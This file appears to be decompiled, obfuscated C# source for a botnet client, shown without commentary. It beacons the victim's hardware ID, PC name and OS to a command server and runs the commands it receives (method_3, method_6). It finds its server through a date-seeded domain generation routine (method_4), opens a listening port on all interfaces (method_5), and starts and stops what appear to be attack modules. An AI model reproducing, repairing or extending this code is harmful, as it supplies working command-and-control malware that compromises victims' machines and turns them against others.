using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal class Class8 : Class7
{
	private string string_0;

	private static Random random_0;

	public void method_2()
	{
		try
		{
			method_4();
		}
		catch
		{
		}
		method_3();
		Thread thread = new Thread(method_6);
		thread.Start();
		Thread thread2 = new Thread(method_5);
		thread2.Start();
		try
		{
			new Class10();
		}
		catch
		{
		}
	}

	private void method_3()
	{
		string string_ = "hwid=" + Class1.class2_0.string_8 + "&mode=0&pcname=" + Class1.class2_0.string_10 + "&system=" + Class1.class2_0.string_9 + "&version=" + Class1.class2_0.string_7 + "&p=" + Class1.class2_0.int_2;
		while (true)
		{
			try
			{
				string text = method_7(Class1.class2_0.method_2(), string_);
				if (text.Length > 0 && text == Class1.class2_0.string_6)
				{
					break;
				}
			}
			catch
			{
			}
			try
			{
				long num = Class1.class2_0.long_0 * 60L * 10000000L;
				if (DateTime.Now.Ticks - Class1.class2_0.method_0() >= num)
				{
					method_4();
				}
			}
			catch
			{
			}
			Thread.Sleep(Class1.class2_0.int_0 * 1000);
		}
	}

	private void method_4()
	{
		int day = DateTime.UtcNow.Day;
		int month = DateTime.UtcNow.Month;
		int year = DateTime.UtcNow.Year;
		Class9 @class = new Class9(Class1.class2_0.int_3 + day + month + year);
		int[] array = new int[Class1.class2_0.int_4];
		string[] array2 = new string[Class1.class2_0.int_4];
		for (int i = 0; i < Class1.class2_0.int_4; i++)
		{
			array[i] = @class.method_1();
			array2[i] = array[i].ToString();
		}
		int num = 0;
		smethod_0(array);
		string[] string_ = Class1.class2_0.string_11;
		smethod_0(string_);
		new Random();
		string text = new Random().Next(10000000, 90000000).ToString() + new Random().Next(10000000, 90000000);
		string randomFileName = Path.GetRandomFileName();
		randomFileName = randomFileName.Replace(".", "");
		int[] array3 = array;
		for (int j = 0; j < array3.Length; j++)
		{
			int num2 = array3[j];
			string[] array4 = string_;
			foreach (string text2 in array4)
			{
				try
				{
					string text3 = method_7("http://" + num2 + "." + text2, randomFileName + "=" + text);
					if (text3.IndexOf(num2 + "." + text2) > -1 || (text3.IndexOf(randomFileName) > -1 && text3.IndexOf(text) > -1))
					{
						Class1.class2_0.method_3("http://" + num2 + "." + text2 + Class1.class2_0.string_4);
						num = 1;
						break;
					}
				}
				catch
				{
				}
				if (num == 1)
				{
					break;
				}
			}
			if (num == 1)
			{
				break;
			}
		}
		Class1.class2_0.method_1(DateTime.Now.Ticks);
	}

	private void method_5()
	{
		try
		{
			GClass14 gClass = new GClass14(IPAddress.Any, Class1.class2_0.int_2);
			gClass.method_6();
		}
		catch
		{
		}
	}

	private void method_6()
	{
		string string_ = "hwid=" + Class1.class2_0.string_8 + "&mode=1&pcname=" + Class1.class2_0.string_10 + "&system=" + Class1.class2_0.string_9 + "&version=" + Class1.class2_0.string_7 + "&p=" + Class1.class2_0.int_2;
		long num = Class1.class2_0.long_0 * 60L * 10000000L;
		while (true)
		{
			try
			{
				try
				{
					if (DateTime.Now.Ticks - Class1.class2_0.method_0() >= num)
					{
						method_4();
					}
				}
				catch
				{
				}
				string text = method_7(Class1.class2_0.method_2(), string_);
				if (text.Length > 0)
				{
					if (text != string_0)
					{
						method_0(text);
						string_0 = text;
					}
				}
				else
				{
					try
					{
						Class19.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class15.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class21.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class17.smethod_1();
					}
					catch
					{
					}
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class1.class2_0.int_0 * 1000);
		}
	}

	private string method_7(string string_1, string string_2)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = Class1.class2_0.string_6;
		httpWebRequest.Timeout = 10000;
		byte[] bytes = Encoding.Default.GetBytes(string_2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	public static void smethod_0<T>(T[] gparam_0)
	{
		Random random = random_0;
		for (int num = gparam_0.Length; num > 1; num--)
		{
			int num2 = random.Next(num);
			T val = gparam_0[num2];
			gparam_0[num2] = gparam_0[num - 1];
			gparam_0[num - 1] = val;
		}
	}

	public Class8()
	{
		Class51.smethod_0();
		string_0 = string.Empty;
		base._002Ector();
	}

	static Class8()
	{
		Class51.smethod_0();
		random_0 = new Random();
	}
}
